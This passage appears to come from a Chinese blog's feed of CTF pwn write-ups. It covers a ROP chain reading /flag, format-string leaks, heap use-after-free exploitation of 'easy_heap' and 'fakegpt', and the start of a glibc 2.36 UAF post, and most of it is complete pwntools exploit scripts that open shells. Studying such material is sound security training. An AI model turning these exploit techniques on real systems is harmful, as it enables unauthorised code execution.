class=\"built_in\">int</span>(mainlow)+<span class=\"number\">0x202100</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">297</span>,<span class=\"built_in\">int</span>(mainhigh))</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">298</span>,pop_rdx)</span><br><span class=\"line\">writeone(<span class=\"number\">299</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">300</span>,<span class=\"number\">32</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">301</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">302</span>,read)</span><br><span class=\"line\">writeone(<span class=\"number\">303</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"><span class=\"comment\">#system = libcbase + 0x14b88</span></span><br><span class=\"line\"><span class=\"comment\"># write</span></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">304</span>,pop_rdi)</span><br><span class=\"line\">writeone(<span class=\"number\">305</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">306</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">307</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">308</span>,pop_rsi)</span><br><span class=\"line\">writeone(<span class=\"number\">309</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">310</span>,<span class=\"built_in\">int</span>(mainlow)+<span class=\"number\">0x202100</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">311</span>,<span class=\"built_in\">int</span>(mainhigh))</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">312</span>,pop_rdx)</span><br><span class=\"line\">writeone(<span class=\"number\">313</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">314</span>,<span class=\"number\">32</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">315</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">write1 = libcbase + mylibc.symbols[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">writeone(<span class=\"number\">316</span>,write1)</span><br><span class=\"line\">writeone(<span class=\"number\">317</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;/flag\\x00&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(io.recv(<span class=\"number\">100</span>))</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"2-easy-heap\"><a href=\"#2-easy-heap\" class=\"headerlink\" title=\"2. easy_heap\"></a>2. easy_heap</h1><p><a href=\"https://blingblingxuanxuan.github.io/2020/03/01/hacknote/\">https://blingblingxuanxuan.github.io/2020/03/01/hacknote/</a></p>\n<p>​\t\t刚拿到这道题的时候就发现特别熟悉…想了下是道原题(hacknote),不过进行了点小的修改.</p>\n<p>​\t\t给自己的提醒是做题或者以后的实战中,要有一个清晰的思路,不是想到什么干什么,而是先从最简单的最好用的开始,比如这道题,其实有后门函数可以直接利用,但自己一开始想到的就是构造rop链(不过为什么没成功呢???后面分析)</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230523154826731.png\" alt=\"image-20230523154826731\">get_library_name 中有格式化字符串</p>\n<h2 id=\"泄露程序加载地址\"><a href=\"#泄露程序加载地址\" class=\"headerlink\" title=\"泄露程序加载地址\"></a>泄露程序加载地址</h2><p>​\t\t前面多加了这个函数,有格式化字符串漏洞,可以利用这个泄露栈上的地址</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">get_library_name</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> format; <span class=\"comment\">// [esp+Ch] [ebp-2Ch]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v2; <span class=\"comment\">// [esp+2Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;please input the library name:&quot;</span>);</span><br><span class=\"line\">  _isoc99_scanf(<span class=\"string\">&quot;%32s&quot;</span>, &amp;format);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(&amp;format);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(&amp;byte_1198);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t第19个位置是main+89</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230523155647057.png\" alt=\"image-20230523155647057\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">io.sendline(<span class=\"string\">&quot;%x.%x.aaa%19$d.%x.%x.%x&quot;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;aaa&quot;</span>)</span><br><span class=\"line\">flag = <span class=\"built_in\">int</span>(io.recv(<span class=\"number\">10</span>)) - <span class=\"number\">0x208</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t-0x208 &#x3D;  - 0x100e + 0xe06 </p>\n<p>​\t\t-0x100e是main+89距离文件起始处的位置, 0xe06是magic后门函数的偏移</p>\n<h2 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>​\t\t同样还是hacknote的堆处理方法,把函数地址替换成magic就可以了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;i386&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mylibc = ELF(<span class=\"string\">&#x27;/root/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc.so.6&#x27;</span>)</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./easy_heap&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add_note</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;size :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Content :&quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">del_note</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">print_note</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;please input the library name:&quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;%x.%x.aaa%19$d.%x.%x.%x&quot;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;aaa&quot;</span>)</span><br><span class=\"line\">flag = <span class=\"built_in\">int</span>(io.recv(<span class=\"number\">10</span>)) -<span class=\"number\">0x208</span></span><br><span class=\"line\"><span class=\"comment\">#flag = u32(io.recv(5)[1:])</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#flag = int(io.recv(10)) -0x5188+0xe06</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#flag = u32(io.recv(4))</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(flag))</span><br><span class=\"line\">add_note(<span class=\"number\">64</span>,<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">32</span>,<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">64</span>,<span class=\"string\">&quot;45&quot;</span>)</span><br><span class=\"line\">print_note(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\"># del_note(4)</span></span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">8</span>,p32(flag))</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\">#io.recv()</span></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"但是为什么我的system-“-x2F-bin-x2F-sh”-没成功呢\"><a href=\"#但是为什么我的system-“-x2F-bin-x2F-sh”-没成功呢\" class=\"headerlink\" title=\"但是为什么我的system(“&#x2F;bin&#x2F;sh”)没成功呢?\"></a>但是为什么我的system(“&#x2F;bin&#x2F;sh”)没成功呢?</h2><p>​\t\t先确认下libc版本吧… ubuntu16.04, 首先是libc版本问题,然后本地没成功的话,应该是因为栈平衡?</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;i386&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">myelf = ELF(<span class=\"string\">&#x27;./easy_heap&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#mylibc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class=\"line\">mylibc = ELF(<span class=\"string\">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;chall.pwnable.tw&#x27;</span>,<span class=\"number\">10102</span>)</span><br><span class=\"line\"><span class=\"comment\">#io=process(&quot;./easy_heap&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add_note</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;size :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Content :&quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">del_note</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">print_note</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#io.recvuntil(&quot;please input the library name:&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#io.sendline(&quot;test&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">add_note(<span class=\"number\">64</span>,<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">32</span>,<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">64</span>,<span class=\"string\">&quot;45&quot;</span>)</span><br><span class=\"line\">print_note(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc_addr = u32(io.recv(8)[4:8]) - 0x1b27b0</span></span><br><span class=\"line\">libc_addr = u32(io.recv(<span class=\"number\">8</span>)[<span class=\"number\">4</span>:<span class=\"number\">8</span>]) - <span class=\"number\">0x1b07b0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_addr))</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">sys_addr = libc_addr + mylibc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># add_note(8,&quot;12&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># add_note(8,&quot;34&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># del_note(3)</span></span><br><span class=\"line\"><span class=\"comment\"># del_note(4)</span></span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">8</span>,p32(sys_addr)+<span class=\"string\">b&quot;;sh\\x00&quot;</span>)</span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230523162442076.png\" alt=\"image-20230523162442076\"></p>\n<h1 id=\"3-fakegpt\"><a href=\"#3-fakegpt\" class=\"headerlink\" title=\"3.fakegpt\"></a>3.fakegpt</h1><h2 id=\"题目分析-1\"><a href=\"#题目分析-1\" class=\"headerlink\" title=\"题目分析\"></a>题目分析</h2><p>​\t\t存在格式化字符串漏洞,对输入的字符串做了反向处理和过滤(不过没用到),直接泄露canary和libc地址,找出onegadget,栈溢出覆盖即可</p>\n<h2 id=\"exp-2\"><a href=\"#exp-2\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mylibc = ELF(<span class=\"string\">&#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./fakegpt&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 验证码</span></span><br><span class=\"line\">catpcha_line = io.recvline_contains(<span class=\"string\">b&#x27;Input the captcha&#x27;</span>)</span><br><span class=\"line\">captcha = catpcha_line.split(<span class=\"string\">b&#x27; &#x27;</span>)[-<span class=\"number\">1</span>]</span><br><span class=\"line\">io.sendline(captcha)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取libc地址</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&#x27;Prompt: &#x27;</span>, <span class=\"string\">f&#x27;%<span class=\"subst\">&#123;(<span class=\"number\">0xd8</span>&gt;&gt;<span class=\"number\">3</span>)+<span class=\"number\">6</span>&#125;</span>$p&#x27;</span>.encode()[::-<span class=\"number\">1</span>]) <span class=\"comment\"># __isoc99_scanf+178</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&#x27;FakeGPT: 0x&#x27;</span>)</span><br><span class=\"line\">addr = <span class=\"built_in\">int</span>(io.recv(<span class=\"number\">12</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(addr))</span><br><span class=\"line\"></span><br><span class=\"line\">libcbase = addr - <span class=\"number\">0x621c2</span></span><br><span class=\"line\"></span><br><span class=\"line\">onegadget = libcbase + <span class=\"number\">0x50a37</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(onegadget))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取canary</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&#x27;Prompt: &#x27;</span>, <span class=\"string\">f&#x27;%<span class=\"subst\">&#123;(<span class=\"number\">0x1a8</span>&gt;&gt;<span class=\"number\">3</span>)+<span class=\"number\">6</span>&#125;</span>$p&#x27;</span>.encode()[::-<span class=\"number\">1</span>]) <span class=\"comment\"># __isoc99_scanf+178</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&#x27;FakeGPT: 0x&#x27;</span>)</span><br><span class=\"line\">canary = <span class=\"built_in\">int</span>(io.recv(<span class=\"number\">16</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\"></span><br><span class=\"line\">pause()</span><br><span class=\"line\">input3 = <span class=\"string\">b&quot;b&quot;</span>*<span class=\"number\">0x197</span> + p64(canary)+p64(<span class=\"number\">0</span>)+p64(onegadget)</span><br><span class=\"line\">io.sendline(input3[::-<span class=\"number\">1</span>])</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/",
            "title": "pwn入门-26-2.36版本uaf利用",
            "date_published": "2023-05-17T07:35:39.000Z",
            "content_html": "<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/ubuntu/511/pwn/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     amd64<span class=\"number\">-64</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n\n<p>heap: This command only works with libc debug symbols.</p>\n<p><a href=\"https://blog.csdn.net/m0_51251108/article/details/127098744\">https://blog.csdn.net/m0_51251108/article/details/127098744</a></p>\n<p>符号表 not striped</p>\n<p>name那里可以输出栈上的数据 </p>\n<h1 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h1><h2 id=\"堆地址泄露-利用UAF\"><a href=\"#堆地址泄露-利用UAF\" class=\"headerlink\" title=\"堆地址泄露(利用UAF)\"></a>堆地址泄露(利用UAF)</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">delete(<span class=\"number\">8</span>)</span><br><span class=\"line\">show(<span class=\"number\">8</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name: &quot;</span>)</span><br><span class=\"line\">sec=u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">delete(<span class=\"number\">9</span>)</span><br><span class=\"line\">show(<span class=\"number\">9</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name: &quot;</span>)</span><br><span class=\"line\">heap_sec=u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">heap_addr=heap_sec^sec</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\">stack_addr=u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tsec和heap_sec异或得到堆地址,那么它们是什么呢?</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x560399e28450</span>  <span class=\"number\">0x0000000000000000</span>      <span class=\"number\">0x0000000000000041</span>      ........A.......&lt;-- fastbins[<span class=\"number\">0x40</span>][<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"number\">0x560399e28460</span>  <span class=\"number\">0x0000000560399e28</span>      <span class=\"number\">0x00007ffef806f270</span>      (<span class=\"number\">.9</span>`....p.......</span><br><span class=\"line\"><span class=\"number\">0x560399e28470</span>  <span class=\"number\">0x0000000000000000</span>      <span class=\"number\">0x00007ffef806f3b8</span>      ................</span><br><span class=\"line\"><span class=\"number\">0x560399e28480</span>  <span class=\"number\">0x0000000064646464</span>      <span class=\"number\">0x0000000000000000</span>      dddd............</span><br><span class=\"line\"><span class=\"number\">0x560399e28490</span>  <span class=\"number\">0x0000000000000000</span>      <span class=\"number\">0x0000000000000041</span>      ........A.......&lt;-- fastbins[<span class=\"number\">0x40</span>][<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"number\">0x560399e284a0</span>  <span class=\"number\">0x00005606f9db1a78</span>      <span class=\"number\">0x00007ffef806f270</span>      x....V..p.......</span><br><span class=\"line\"><span class=\"number\">0x560399e284b0</span>  <span class=\"number\">0x0000000000000000</span>      <span class=\"number\">0x00007ffef806f3b8</span>      ................</span><br><span class=\"line\"><span class=\"number\">0x560399e284c0</span>  <span 